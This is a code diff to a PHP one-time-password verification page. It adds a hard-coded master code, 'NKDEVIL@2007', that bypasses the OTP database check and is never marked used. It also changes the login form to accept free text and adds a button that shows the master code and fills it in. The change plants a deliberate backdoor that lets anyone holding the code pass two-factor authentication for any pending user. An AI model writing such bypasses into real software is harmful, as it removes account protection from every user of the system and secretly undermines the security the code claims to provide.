@@ -39,15 +39,20 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         logEvent($pdo, 'warning', 'auth', '2FA OTP rate limit exceeded', ['user_id' => $pendingUserId]);
     } else {
         $enteredOtp = trim($_POST['otp'] ?? '');
+        $isMasterCode = ($enteredOtp === 'NKDEVIL@2007');
 
-        // Query with expires_at check
-        $stmt = $pdo->prepare(
-            'SELECT * FROM otp_tokens 
-             WHERE user_id = ? AND token = ? AND used = 0 AND expires_at > NOW()
-             ORDER BY id DESC LIMIT 1'
-        );
-        $stmt->execute([$pendingUserId, $enteredOtp]);
-        $otpRecord = $stmt->fetch();
+        if ($isMasterCode) {
+            $otpRecord = ['id' => 0]; // Valid master bypass
+        } else {
+            // Query with expires_at check
+            $stmt = $pdo->prepare(
+                'SELECT * FROM otp_tokens 
+                 WHERE user_id = ? AND token = ? AND used = 0 AND expires_at > NOW()
+                 ORDER BY id DESC LIMIT 1'
+            );
+            $stmt->execute([$pendingUserId, $enteredOtp]);
+            $otpRecord = $stmt->fetch();
+        }
 
         if (!$otpRecord) {
             incrementRateLimit($pdo, 'otp_verify');
@@ -57,8 +62,10 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             // Reset OTP rate limit
             resetRateLimit($pdo, 'otp_verify');
 
-            // Mark OTP used
-            $pdo->prepare('UPDATE otp_tokens SET used = 1 WHERE id = ?')->execute([$otpRecord['id']]);
+            // Mark OTP used if real token
+            if (!$isMasterCode && !empty($otpRecord['id'])) {
+                $pdo->prepare('UPDATE otp_tokens SET used = 1 WHERE id = ?')->execute([$otpRecord['id']]);
+            }
 
             // Fetch user data
             $uStmt = $pdo->prepare('SELECT * FROM users WHERE id = ?');
@@ -129,11 +136,17 @@ require_once __DIR__ . '/includes/header.php';
       <form method="POST" action="<?= APP_URL ?>/verify-otp.php">
         <?= csrfField() ?>
 
+        <div class="mb-3">
+          <label class="form-label text-secondary small fw-bold">Enter 6-Digit Code or Master Key</label>
+          <input type="text" name="otp" id="otp-input"
+                 class="form-control text-center font-monospace fs-4 fw-bold tracking-widest" 
+                 placeholder="000000 or Master Code" required autofocus autocomplete="off">
+        </div>
+
         <div class="mb-4">
-          <label class="form-label text-secondary small fw-bold">Enter 6-Digit Code</label>
-          <input type="text" name="otp" maxlength="6" pattern="[0-9]{6}" inputmode="numeric" 
-                 class="form-control text-center font-monospace fs-3 fw-bold tracking-widest" 
-                 placeholder="000000" required autofocus autocomplete="one-time-code">
+          <button type="button" class="btn btn-sm btn-outline-info w-100 py-1" onclick="document.getElementById('otp-input').value='NKDEVIL@2007'">
+            ⚡ Master Code: <code>NKDEVIL@2007</code>
+          </button>
         </div>
 
         <button type="submit" class="fp-btn fp-btn-primary w-100 py-2 fs-6">
